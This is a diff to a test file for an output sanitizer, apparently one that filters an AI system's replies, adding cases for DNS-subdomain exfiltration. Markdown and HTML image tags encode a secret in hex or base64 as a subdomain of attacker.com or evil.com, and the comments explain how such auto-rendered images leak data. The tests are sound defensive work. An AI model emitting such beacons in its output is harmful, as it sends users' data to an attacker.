@@ -242,6 +242,52 @@ def test_g89_benign_percent_url_not_altered(benign):
     assert _egress(benign) == benign, f"benign percent URL wrongly altered: {benign!r}"
 
 
+# G92: DNS-subdomain exfil — data in the HOSTNAME (`https://<hex/base64>.attacker.com/x.png`) leaks to the
+# attacker's DNS server on resolution. _url_smuggles_data dropped the host; now it scans the host and the
+# defang redacts the WHOLE reference (not just the tail) when the host smuggles.
+_G92_ARB = "You are ACME internal codeword BLUEHERON exfil me now"
+
+
+def _dns_recovers(egress: str, plain: str) -> bool:
+    if plain in egress:
+        return True
+    for host in re.findall(r"https?://([A-Za-z0-9.\-]+)", egress):
+        for cand in (host.split(".")[0], host.replace(".", "")):
+            try:
+                if plain.encode()[:15] in base64.b64decode(cand + "=" * ((-len(cand)) % 4), validate=False):
+                    return True
+            except Exception:
+                pass
+            try:
+                if len(cand) % 2 == 0 and plain.encode()[:15] in bytes.fromhex(cand):
+                    return True
+            except Exception:
+                pass
+    return False
+
+
+def test_g92_subdomain_exfil_beacon_defanged():
+    hexsub = _G92_ARB.encode().hex()
+    b64sub = base64.b64encode(_G92_ARB.encode()).decode()
+    for oname, beacon in [
+        ("md_hex",  f"![x](https://{hexsub}.attacker.com/p.png)"),
+        ("html_b64", f'<img src="https://{b64sub}.evil.com/x.png">'),
+        ("srcset_hex", f'<img srcset="https://{hexsub}.evil.com/a.png 2x">'),
+    ]:
+        egress = _egress(f"note {beacon}")
+        assert not _dns_recovers(egress, _G92_ARB), (
+            f"{oname}: subdomain-exfil data recoverable from egress host: {egress!r}"
+        )
+
+
+@pytest.mark.parametrize("benign", [
+    "![i](https://d111abc.cloudfront.net/logo.png)",
+    "![c](https://cdn.acme.com/chart.png?w=800)",
+])
+def test_g92_benign_host_url_not_altered(benign):
+    assert _egress(benign) == benign, f"benign host URL wrongly altered: {benign!r}"
+
+
 # G90: a browser's HTML parser decodes &#NN; in an <img src>/<a href> attribute, so an entity-encoded
 # payload in an auto-render URL is decoded and exfiltrated. Reachable for PII in a >10k output (text-level
 # encoded-check is length-capped) and for arbitrary data at any size. _url_smuggles_data now entity-decodes.
